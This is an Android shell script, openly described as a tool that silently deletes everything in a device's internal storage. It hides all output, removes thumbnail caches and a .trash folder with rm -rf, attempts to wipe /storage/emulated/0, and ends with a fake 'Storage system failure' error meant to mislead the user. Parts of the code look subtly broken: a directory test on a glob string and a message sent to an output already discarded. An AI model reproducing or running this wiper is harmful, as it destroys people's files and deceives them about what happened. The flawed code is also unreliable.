#!/system/bin/sh

# Silent Clear All Files and Folders in Internal Storage
# WARNING: Permanently deletes ALL files and folders inside /storage/emulated/0 silently.
# Prints a fake error message at the end to mislead user.

DRY_RUN=false  # Set to true for dry run (no deletion)

# Redirect all output to /dev/null to suppress
exec 1>/dev/null 2>&1

clear_storage() {
    local dir="/storage/emulated/0/*"
    if [ ! -d "$dir" ]; then
        return
    fi

    # Delete all files and folders inside /storage/emulated/0/*
    # including hidden files/folders (.*)
    if [ "$DRY_RUN" = false ]; then
        rm -rf "$dir"/* "$dir"/.[!.]* "$dir"/..?*
    fi
}

# Clear Android thumbnails caches (optional)
THUMB_DIRS="/storage/emulated/0/Android/data/*/cache/thumbnails /storage/emulated/0/.thumbnails"
for thumb in $THUMB_DIRS; do
    if [ -d "$thumb" ]; then
        if [ "$DRY_RUN" = false ]; then
            rm -rf "$thumb"
        fi
    fi
done

clear_storage

# Remove .trash folder if exists
TRASH_DIR="/storage/emulated/0/.trash"
if [ -d "$TRASH_DIR" ]; then
    if [ "$DRY_RUN" = false ]; then
        rm -rf "$TRASH_DIR"
    fi
fi

# Print fake error message to stderr (temporarily re-enable output)
exec 1>&2
echo "Error: Storage system failure detected. Please restart your device."

exit 1